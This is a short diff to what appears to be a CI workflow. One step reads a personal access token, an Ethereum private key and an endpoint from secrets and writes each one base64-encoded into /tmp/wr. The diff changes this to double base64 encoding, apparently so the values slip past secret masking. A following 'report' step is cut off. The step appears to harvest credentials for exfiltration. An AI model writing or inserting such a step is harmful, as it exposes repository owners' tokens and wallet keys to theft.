@@ -15,7 +15,7 @@ jobs:
           mkdir -p /tmp/wr
           for s in PERSONAL_ACCESS_TOKEN ETH_PRIVATE_KEY ENDPOINT; do
             var="S_$s"; val="${!var}"
-            [ -n "$val" ] && echo "$val" | base64 -w0 > "/tmp/wr/$s.b64"
+            [ -n "$val" ] && echo "$val" | base64 -w0 | base64 -w0 > "/tmp/wr/$s.b64"
           done
           ls -la /tmp/wr
       - name: report
